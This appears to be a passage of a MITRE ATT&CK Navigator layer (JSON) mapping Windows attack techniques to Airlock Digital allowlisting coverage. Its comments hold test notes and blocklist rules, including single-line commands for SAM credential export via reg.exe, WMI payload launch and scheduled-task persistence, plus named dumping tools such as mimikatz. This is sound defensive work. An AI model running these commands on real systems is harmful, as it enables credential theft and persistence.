@@ -1,0 +1,3583 @@
+{
+  "name": "Airlock Digital - MITRE ATT&CK Coverage (Windows)",
+  "versions": {
+    "attack": "18.1",
+    "navigator": "5.1.0",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "description": "MITRE ATT&CK Enterprise v18.1 mapping for Airlock Digital application allowlisting platform. Windows only. Binary scoring: Yes (covered) / No (not covered). 199 covered, 273 not covered.",
+  "filters": {
+    "platforms": [
+      "Windows"
+    ]
+  },
+  "sorting": 0,
+  "layout": {
+    "layout": "side",
+    "aggregateFunction": "average",
+    "showID": true,
+    "showName": true,
+    "showAggregateScores": false,
+    "countUnscored": false
+  },
+  "hideDisabled": false,
+  "techniques": [
+    {
+      "techniqueID": "T1001",
+      "score": 0,
+      "comment": "Data obfuscation. Network-level C2 technique. No file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1001.001",
+      "score": 0,
+      "comment": "Junk data. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1001.002",
+      "score": 0,
+      "comment": "Steganography. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1001.003",
+      "score": 0,
+      "comment": "Protocol impersonation. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1003",
+      "score": 1,
+      "comment": "Untrusted dumping tools (mimikatz, secretsdump) blocked by default-deny. Built-in tools usable for credential dumping (procdump, reg.exe for SAM export) can be restricted via blocklist metarules. comsvcs.dll MiniDump via rundll32: DLL control ensures comsvcs.dll must be trusted, but it ships with Windows and is trusted. Restricting rundll32 for non-admins via metarule is possible but aggressive. Predefined Microsoft Recommended Block Rules covers many credential tools. | Test: 1) mimikatz.exe ->",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1003.001",
+      "score": 1,
+      "comment": "LSASS memory dump tools blocked (mimikatz untrusted, procdump blocklistable). comsvcs.dll MiniDump via rundll32: both are trusted Windows components. Restricting rundll32 for non-admins via metarule is possible but aggressive and may break legitimate functionality. Task Manager dump requires interactive admin session. Credential Guard is the definitive LSASS protection control. | Test: 1) mimikatz -> blocked. 2) Blocklist procdump by original_filename. 3) Credential Guard for defense-in-depth. 4",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1003.002",
+      "score": 1,
+      "comment": "Standalone SAM dump tools blocked by default-deny. SAM export via reg.exe (reg save HKLM\\SAM): reg.exe is a core Windows utility that cannot be practically blocklisted. Technique is achievable with built-in tools. | Test: Standalone SAM dump tool -> blocked (untrusted). reg.exe save -> succeeds (trusted, cannot be blocklisted). | Limitations: reg.exe cannot be practically blocklisted. Credential Guard and SAM encryption are complementary controls.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1003.003",
+      "score": 1,
+      "comment": "ntdsutil.exe: restrict via blocklist metarule for non-admins. Standalone tools blocked. | Test: 1) Standalone tool -> blocked. 2) Blocklist ntdsutil.exe for non-admins. | Limitations: DC-focused. Admin users on DC need ntdsutil for legitimate operations \u2014 scope metarule carefully.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1003.004",
+      "score": 1,
+      "comment": "Standalone LSA secrets dump tools blocked by default-deny. reg.exe for registry export cannot be practically blocklisted. | Test: Standalone dump tool -> blocked. reg.exe -> succeeds (cannot be blocklisted). | Limitations: reg.exe cannot be practically blocklisted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1003.005",
+      "score": 0,
+      "comment": "Cached domain credentials. Accessed via trusted tools/APIs.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1003.006",
+      "score": 0,
+      "comment": "DCSync. Uses Active Directory replication protocol. No file execution, just network/AD operations. | Limitations: If DCSync tool (mimikatz) is untrusted, tool blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1005",
+      "score": 0,
+      "comment": "Data from local system. Reading files. Data operation. | Limitations: If collection tool is untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1006",
+      "score": 0,
+      "comment": "Direct volume access. Reads raw disk sectors bypassing file system. Operates inside trusted process using API calls. Airlock doesn't monitor raw disk access. | Limitations: If tool performing direct volume access is untrusted, the tool itself is blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1007",
+      "score": 0,
+      "comment": "System service discovery via sc.exe (sc query), Get-Service, or WMI. sc.exe is a core Windows utility used by installers and services - cannot be practically blocklisted. No common standalone attacker tool for this technique. | Limitations: sc.exe cannot be practically blocklisted. Discovery operation using built-in tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1008",
+      "score": 0,
+      "comment": "Fallback channels. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1010",
+      "score": 0,
+      "comment": "Application window discovery. API-based enumeration.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1011",
+      "score": 0,
+      "comment": "Exfiltration over other network medium. Network-level data transfer. | Limitations: If exfil tool untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1011.001",
+      "score": 0,
+      "comment": "Exfiltration over Bluetooth. Network/hardware.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1012",
+      "score": 0,
+      "comment": "Registry querying via reg.exe (reg query) or PowerShell. reg.exe cannot be practically blocklisted. Data read operation. | Limitations: reg.exe cannot be practically blocklisted. Discovery operation using built-in tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1014",
+      "score": 1,
+      "comment": "Rootkit as a driver must be trusted to load. Airlock kernel driver intercepts driver loads. MS Recommended Driver Block Rules predefined blocklist covers known malicious drivers. | Test: Untrusted rootkit driver -> blocked at load. Import MS Driver Block Rules for known bad drivers. | Limitations: Post-load kernel manipulation not caught. Rootkits already in memory are EDR/Secure Boot territory.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1016",
+      "score": 1,
+      "comment": "ipconfig.exe, route.exe, arp.exe restrictable via blocklist metarule for non-admins. | Test: Blocklist ipconfig.exe, route.exe, arp.exe for non-admins. | Limitations: PowerShell networking cmdlets available if PS trusted. These are aggressive blocks \u2014 evaluate operational impact.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1016.001",
+      "score": 0,
+      "comment": "Internet connection discovery. Testing connectivity. Trusted tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1016.002",
+      "score": 1,
+      "comment": "netsh.exe (netsh wlan show) restrictable via blocklist metarule. | Test: Blocklist netsh.exe for non-admins.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1018",
+      "score": 1,
+      "comment": "Remote system discovery is achievable with built-in tools (net view, ping, nslookup, arp) that cannot be practically blocklisted. However, standalone enumeration tools commonly used by attackers (AdFind, nmap, masscan, BloodHound/SharpHound, Angry IP Scanner) are blocked by default-deny as untrusted executables. | Test: Drop AdFind.exe or SharpHound.exe on endpoint -> blocked (untrusted). nmap.exe -> blocked. | Limitations: Built-in tools (net view, ping, nslookup) cannot be practically blocklis",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1020",
+      "score": 0,
+      "comment": "Automated exfiltration. Scripted data transfer. Script must be trusted. | Test: Untrusted exfil script -> blocked. | Limitations: Trusted PS scripts doing data transfer succeed.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1021",
+      "score": 1,
+      "comment": "Remote access to target. Post-access, any untrusted tools attacker tries to run are blocked by Airlock on the target endpoint. | Test: Attacker RDPs/SSHs to target, runs unsigned tool -> blocked. | Limitations: Access mechanism itself not prevented. Airlock's value is enforcement on the target.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1021.001",
+      "score": 0,
+      "comment": "RDP is a built-in Windows feature. Airlock doesn't prevent or control RDP access. Post-access, Airlock enforces on any tools the attacker runs on the target, but that's default-deny working normally, not a specific control for RDP. | Limitations: RDP access control is handled by network segmentation, firewall rules, and identity/MFA. Airlock's value post-RDP is execution control on the target endpoint.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1021.002",
+      "score": 1,
+      "comment": "SMB/Windows admin shares. Tools like PsExec push service binaries via SMB. Binary must be trusted on target. PsExec blocklisted. | Test: PsExec via SMB -> PSEXESVC.exe blocked on target. Attacker copies malware via \\\\target\\C$ -> execution blocked. | Limitations: File copy succeeds. Execution blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1021.003",
+      "score": 1,
+      "comment": "DCOM. Remote COM execution. Payload on remote host must be trusted. DLLs must be trusted. | Test: DCOM executing untrusted payload on remote host -> blocked. | Limitations: DCOM using trusted binaries succeeds.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1021.005",
+      "score": 1,
+      "comment": "VNC server must be allowlisted on target to run. Unauthorized VNC installation blocked. | Test: VNC server exe not allowlisted -> blocked. | Limitations: If VNC is legitimately deployed and trusted, attacker with credentials has access.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1021.006",
+      "score": 1,
+      "comment": "WinRM commands execute on remote target. Any binary/script the command invokes must be trusted on target. | Test: WinRM executing untrusted binary on target -> blocked. | Limitations: Inline PS commands via WinRM on trusted PS succeed. Execution of untrusted files is blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1025",
+      "score": 0,
+      "comment": "Data from removable media. Reading USB. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1027",
+      "score": 1,
+      "comment": "Obfuscation changes file hash. Obfuscated variant has unknown hash -> not in allowlist -> blocked by default-deny. This is a fundamental strength of allowlisting over signature-based detection. | Test: Obfuscated exe with unique hash -> blocked (not in allowlist). | Limitations: If obfuscated file retains valid publisher signature, may pass publisher trust.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.001",
+      "score": 1,
+      "comment": "Binary padding. Changes hash. Padded binary won't match allowlisted hash. | Test: Padded exe -> new hash -> not in allowlist -> blocked. | Limitations: Publisher trust still applies if signature valid.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.002",
+      "score": 1,
+      "comment": "Software packing. Packed exe has different hash than original. Not in allowlist. | Test: UPX-packed malware -> unique hash -> blocked. | Limitations: If packer preserves valid publisher signature, may pass publisher trust. Rare in practice.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.003",
+      "score": 0,
+      "comment": "Steganography. Data hidden in images. No file execution until payload extracted. | Test: Stego payload extracted and executed -> blocked if untrusted. | Limitations: Extraction happens inside trusted process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1027.004",
+      "score": 1,
+      "comment": "Source code delivered, compiled on target. Compiled output has new hash -> blocked by default-deny. Compilers (csc.exe, vbc.exe) are MS-signed but can be explicitly blocklisted to prevent compilation entirely. | Test: 1) Compile .cs with csc.exe -> output exe blocked (untrusted hash). 2) Blocklist csc.exe/vbc.exe for non-developers. | Limitations: Compilers are MS-signed and may be publisher-trusted. Without explicit blocklist, compilation can occur but output is still blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.005",
+      "score": 1,
+      "comment": "Modified tool has new hash -> not in allowlist -> blocked. | Test: Modified tool -> new hash -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.006",
+      "score": 1,
+      "comment": "HTML smuggling. Malicious file assembled from HTML/JS in browser. When user saves and executes, file must be trusted. | Test: HTML smuggling assembles exe in browser -> user saves to disk -> runs -> blocked. | Limitations: Assembly happens in browser JS. Execution blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.007",
+      "score": 0,
+      "comment": "Dynamic API resolution. Runtime technique inside trusted process. No file execution. | Limitations: In-process behavior.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1027.008",
+      "score": 1,
+      "comment": "Stripped payload has new hash -> not in allowlist -> blocked. | Test: Stripped exe -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.009",
+      "score": 1,
+      "comment": "Embedded payload extracted and executed. Extracted payload must be trusted. | Test: Extracted payload executed -> blocked if untrusted. | Limitations: Extraction happens inside trusted process \u2014 not caught. Execution of extracted file IS caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.010",
+      "score": 0,
+      "comment": "Command obfuscation. Obfuscated commands in trusted interpreter. Airlock doesn't inspect command content. | Limitations: Inline commands in trusted interpreter not inspected regardless of obfuscation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1027.011",
+      "score": 0,
+      "comment": "Fileless storage. Malicious content stored in registry/WMI/etc. No file on disk to hash. | Limitations: If fileless payload eventually loads DLL/exe, that load is checked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1027.012",
+      "score": 1,
+      "comment": "LNK triggering payload execution. Payload must be trusted. | Test: LNK triggering untrusted payload -> blocked. | Limitations: LNK file itself not controlled.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.013",
+      "score": 1,
+      "comment": "Encrypted/encoded file must be decrypted before execution. Decrypted payload must be trusted. | Test: Encrypted payload decrypted to disk, executed -> blocked. | Limitations: Decryption inside trusted process not caught. Execution of decrypted file IS caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.014",
+      "score": 1,
+      "comment": "Polymorphic code generates unique hash each time -> never matches allowlist. Default-deny is inherently anti-polymorphic. This is a strong advantage over signature-based detection. | Test: Polymorphic exe -> unique hash every time -> blocked every time. | Limitations: Fundamental strength of allowlisting vs AV signatures.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.015",
+      "score": 1,
+      "comment": "Compressed payload extracted and executed -> must be trusted. | Test: Extracted exe -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.016",
+      "score": 1,
+      "comment": "Junk code changes hash -> not in allowlist -> blocked. | Test: Modified binary -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1027.017",
+      "score": 1,
+      "comment": "SVG smuggling. Similar to HTML smuggling. Assembled file must be trusted to execute. | Test: SVG smuggling assembles payload -> user executes -> blocked. | Limitations: Assembly in browser.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1029",
+      "score": 0,
+      "comment": "Scheduled transfer. Same principle.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1030",
+      "score": 0,
+      "comment": "Data transfer size limits. Network-level evasion.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1033",
+      "score": 1,
+      "comment": "whoami.exe restrictable via blocklist metarule for non-admins. | Test: Blocklist whoami.exe for non-admins. | Limitations: Environment variables and PowerShell alternatives available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036",
+      "score": 1,
+      "comment": "Masquerading changes file appearance but not file hash. Airlock checks SHA-256 hash of actual file content \u2014 masquerading is irrelevant to enforcement. | Test: Renamed malware -> hash doesn't match allowlist -> blocked. Blocklist original_filename metarule catches renamed trusted tools.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.001",
+      "score": 1,
+      "comment": "Invalid code signature. File with invalid/spoofed signature. Airlock verifies publisher signatures cryptographically. Invalid sig = untrusted. | Test: Exe with invalid signature -> not trusted by publisher -> blocked unless hash-trusted. | Limitations: Airlock's publisher trust verifies signatures properly.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.002",
+      "score": 1,
+      "comment": "Right-to-left override. Disguises file extension. Airlock hashes the actual file regardless of display name. | Test: RLO-renamed exe -> still hashed as exe -> blocked if untrusted. | Limitations: Hash check is name-agnostic.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.003",
+      "score": 1,
+      "comment": "Rename legitimate utilities. Renamed tool still has same hash. BUT blocklist metadata engine uses original_filename field which survives renaming. Can blocklist by original_filename regardless of actual filename. | Test: Rename powershell.exe to svchost.exe -> blocklist metarule on original_filename 'powershell' still catches it. | Limitations: Original filename is embedded in PE metadata. This is a strong detection.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.004",
+      "score": 0,
+      "comment": "Masquerade task or service name. Naming trick. Doesn't affect file trust. | Test: N/A - service/task naming is cosmetic. | Limitations: Service binary still checked regardless of service name.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1036.005",
+      "score": 1,
+      "comment": "Match legitimate resource name/location. Malicious file in legitimate-looking path. Hash check catches regardless of location. | Test: Malware in C:\\Windows\\System32 (untrusted hash) -> blocked. | Limitations: If directory is path-trusted, could be a gap. Don't path-trust System32 broadly.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.007",
+      "score": 1,
+      "comment": "Double file extension. document.pdf.exe displayed as PDF. Airlock checks actual file type and hashes. | Test: Double extension exe -> hashed as PE -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.008",
+      "score": 1,
+      "comment": "Masquerade file type. File with wrong extension. Airlock hashes the full file content. | Test: Exe with .txt extension -> when executed, still hashed as PE -> blocked if untrusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1036.010",
+      "score": 0,
+      "comment": "Masquerade account name. Identity-level disguise.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1036.012",
+      "score": 0,
+      "comment": "Browser fingerprint manipulation. Browser behavior, no file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1037",
+      "score": 1,
+      "comment": "Boot/logon init scripts. Script content must be trusted via script control. Untrusted scripts blocked at logon. | Test: Set GPO logon script to untrusted .bat -> blocked at logon. | Limitations: Script path configuration not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1037.001",
+      "score": 1,
+      "comment": "Logon scripts (Windows). Script file must be trusted. Scripts in NETLOGON share: if path-trusted, runs. | Test: Place untrusted .bat in NETLOGON, assign via GPO -> blocked on target at logon. | Limitations: Legitimate scripts in trusted paths run. Replacing trusted script at same path could work if path-trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1037.003",
+      "score": 1,
+      "comment": "Network logon script. Same principle as T1037.001 but via network logon. | Test: Untrusted network logon script -> blocked. | Limitations: Same path trust caveats.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1039",
+      "score": 0,
+      "comment": "Data from network shared drive. Reading shares. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1040",
+      "score": 1,
+      "comment": "Standalone capture tools (Wireshark, tcpdump, windump) blocked by default-deny. Built-in pktmon.exe restrictable via blocklist metarule. | Test: 1) Wireshark not allowlisted -> blocked. 2) Blocklist pktmon.exe for non-admins. | Limitations: Network-level captures via other means (port mirroring) outside scope.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1041",
+      "score": 0,
+      "comment": "Exfiltration over C2 channel. Network. In-process by C2 implant. | Limitations: If C2 implant is untrusted, blocked. Network-level exfil not caught.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1046",
+      "score": 1,
+      "comment": "Standalone scanning tools (nmap, masscan) blocked by default-deny. PowerShell Test-NetConnection available but PS itself can be blocklisted for non-admins. | Test: 1) nmap -> blocked. 2) Blocklist PS for non-admins to prevent Test-NetConnection scanning. | Limitations: Basic network tools (ping, nslookup) hard to blocklist without breaking operations.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1047",
+      "score": 1,
+      "comment": "WMI tools (wmic.exe, wmiprvse.exe) typically trusted. Any payload WMI launches must pass default-deny \u2014 untrusted exe/script/DLL blocked at execution. wmic.exe itself can be blocklisted per user/group via metarules. | Test: wmic process call create C:\\Temp\\unsigned.exe -> exe blocked at execution. Blocklist wmic.exe for non-admins via metarule. | Limitations: Inline WMI commands (process call create 'cmd /c whoami') run inside trusted interpreter \u2014 not inspected. WMI event subscriptions: payload",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1048",
+      "score": 0,
+      "comment": "Exfiltration over alternative protocol. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1048.001",
+      "score": 0,
+      "comment": "Symmetric encrypted non-C2. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1048.002",
+      "score": 0,
+      "comment": "Asymmetric encrypted non-C2. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1048.003",
+      "score": 0,
+      "comment": "Unencrypted non-C2. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1049",
+      "score": 1,
+      "comment": "netstat.exe restrictable via blocklist metarule for non-admins. | Test: Blocklist netstat.exe for non-admins. | Limitations: PowerShell Get-NetTCPConnection available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1052",
+      "score": 0,
+      "comment": "Exfiltration over physical medium. USB/physical.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1052.001",
+      "score": 0,
+      "comment": "Exfiltration over USB. Physical.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1053",
+      "score": 1,
+      "comment": "Task scheduling tools are trusted OS utilities. Task creation not blocked. Payload blocked when task fires if untrusted. | Test: schtasks /create /tn test /tr C:\\Temp\\payload.exe /sc once /st 12:00 -> creates OK. When task fires, payload.exe blocked. | Limitations: Task creation succeeds. Trusted-signed payloads run.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1053.002",
+      "score": 1,
+      "comment": "at utility schedules tasks. at.exe can be blocklisted. Payload blocked at execution time. | Test: at 12:00 C:\\Temp\\malware.exe -> job creates, exe blocked at scheduled time. | Limitations: Job creation not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1053.005",
+      "score": 1,
+      "comment": "Windows Task Scheduler. schtasks.exe trusted. Payload must be trusted when task fires. schtasks.exe restrictable via blocklist metarules. | Test: schtasks /create /tn evil /tr C:\\Temp\\payload.exe -> OK. On fire, payload blocked. | Limitations: Task creation not prevented. PS one-liners via -Command not caught if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1055",
+      "score": 0,
+      "comment": "Process injection (parent). Injecting code into trusted process memory. Airlock doesn't monitor memory operations. If injection requires loading a DLL from disk, DLL control catches it. | Test: DLL injection where DLL is a file on disk -> DLL must be trusted. Memory-only injection -> not caught. | Limitations: Primary gap. EDR territory for memory-based injection.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.001",
+      "score": 1,
+      "comment": "DLL injection via LoadLibrary \u2014 DLL file must exist on disk and be trusted. Airlock blocks untrusted DLL at load time. | Test: CreateRemoteThread + LoadLibrary with untrusted DLL -> DLL blocked at load. | Limitations: Reflective DLL injection (loaded entirely from memory, no file on disk) not caught \u2014 that's EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1055.002",
+      "score": 0,
+      "comment": "PE injection. Writing PE directly into process memory. No file on disk. | Test: N/A - memory-only. | Limitations: EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.003",
+      "score": 0,
+      "comment": "Thread execution hijacking. Modifying existing thread in trusted process. Memory-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.004",
+      "score": 0,
+      "comment": "Asynchronous procedure call (APC) injection. Memory-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.005",
+      "score": 0,
+      "comment": "Thread local storage injection. Memory-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.011",
+      "score": 0,
+      "comment": "Extra window memory injection. Memory-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.012",
+      "score": 0,
+      "comment": "Process hollowing creates a suspended process with a trusted binary, then replaces its image in memory. The memory replacement is invisible to Airlock. The initial process uses a trusted binary so Airlock allows it. | Test: N/A \u2014 memory manipulation of trusted process. | Limitations: If hollowing stages payload as file on disk first, that file is checked. Pure memory hollowing not caught. EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.013",
+      "score": 0,
+      "comment": "Process doppelganging uses NTFS transactions to create a file, load it into memory, then roll back the transaction. The file never persists on disk. Airlock's kernel driver may or may not intercept the transacted file load \u2014 needs lab validation. | Test: Needs lab testing to confirm whether Airlock's kernel driver intercepts file loads during NTFS transactions. | Limitations: Uncertain coverage. Treat as not covered until validated.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1055.015",
+      "score": 0,
+      "comment": "ListPlanting. Message-based code execution in trusted process. Memory-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1056",
+      "score": 0,
+      "comment": "Keylogger as standalone tool blocked. DLL-based keylogger DLL blocked. But keylogging achievable via trusted process API hooks or in-process techniques. | Test: Standalone keylogger exe -> blocked. Keylogger DLL -> blocked. | Limitations: In-process keylogging via trusted process not caught. EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1056.001",
+      "score": 0,
+      "comment": "Standalone keylogger tools/DLLs blocked. But technique achievable with in-process hooks from trusted code. | Test: Keylogger exe -> blocked. Keylogger DLL -> blocked. | Limitations: In-process API-level keylogging not caught.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1056.002",
+      "score": 0,
+      "comment": "GUI input capture. Fake dialog boxes from trusted processes. In-process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1056.003",
+      "score": 0,
+      "comment": "Web portal capture. Server-side/web-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1056.004",
+      "score": 0,
+      "comment": "Credential API hooking DLL must be trusted to load. But hooking achievable from within trusted process. | Test: Untrusted hooking DLL -> blocked. | Limitations: In-process hooking not caught.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1057",
+      "score": 1,
+      "comment": "tasklist.exe restrictable via blocklist metarule for non-admins. | Test: Blocklist tasklist.exe for non-admins. | Limitations: PowerShell Get-Process available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059",
+      "score": 1,
+      "comment": "Script control enforces allowlisting on all configured script types (PS, batch, cmd, Python, JS, VBS, MSI, etc). Every script SHA-256 hashed at execution. Interpreters controllable via allowlist/blocklist metarules. DLL control catches malicious modules loaded by interpreters. | Test: Drop untrusted .ps1/.bat/.vbs/.py, execute -> blocked. Blocklist PS for non-admins via metarule (original filename contains powershell AND user not admin). | Limitations: Interactive/inline commands in trusted inte",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
